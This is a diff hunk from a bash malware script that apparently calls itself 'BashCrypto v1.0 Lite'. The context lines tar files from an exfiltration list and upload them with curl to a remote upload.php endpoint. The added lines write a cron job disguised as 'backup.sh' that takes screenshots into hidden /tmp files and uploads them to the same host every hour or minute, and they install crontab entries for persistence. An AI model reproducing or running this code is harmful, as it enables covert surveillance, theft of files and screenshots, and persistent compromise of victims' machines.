@@ -224,3 +224,30 @@ for file in "${exfilArr[@]}"
 do
   tar czf - "${file}" |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=$(basename "${file}").tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 done
+
+if [ -f "/usr/bin/gnome-screenshot" ]
+then
+  {
+    echo -en  "#"'!'"/bin/bash"
+    echo -e "\n"
+    echo -e "getDate=\$(date)"
+    echo -e "\n"
+    echo -e "genKey=\"${genKey}\""
+    echo -e "\n"
+    echo -e "/usr/bin/gnome-screenshot -f \"/tmp/.\${getDate}.screenshot\""
+    echo -e "\n"
+    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
+  } > /etc/cron.hourly/backup.sh
+
+  chmod 755 /etc/cron.hourly/backup.sh
+
+  if [ "${osType}" == "redhat" ]
+  then
+    /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
+  elif [ "${osType}" == "debian" ]
+  then
+    /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
+  else
+    echo "Could not set crontab" &>/dev/null
+  fi
+fi
